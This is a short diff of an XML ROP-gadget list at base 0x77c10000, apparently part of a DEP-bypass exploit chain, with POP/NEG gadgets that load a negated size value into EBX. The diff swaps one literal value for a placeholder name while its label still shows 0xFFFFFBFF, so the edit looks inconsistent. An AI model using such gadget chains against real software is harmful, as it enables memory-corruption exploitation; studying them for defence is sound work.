@@ -8,7 +8,7 @@
 
 	<gadgets base="0x77c10000">
 		<gadget offset="0x0002b860">POP EAX # RETN</gadget>
-		<gadget value="0xFFFFFBFF">0xFFFFFBFF -> ebx</gadget>
+		<gadget value="safe_negate_size">0xFFFFFBFF -> ebx</gadget>
 		<gadget offset="0x0000be18">NEG EAX # POP EBP # RETN</gadget>
 		<gadget value="junk">JUNK</gadget>
 		<gadget offset="0x0001362c">POP EBX # RETN</gadget>
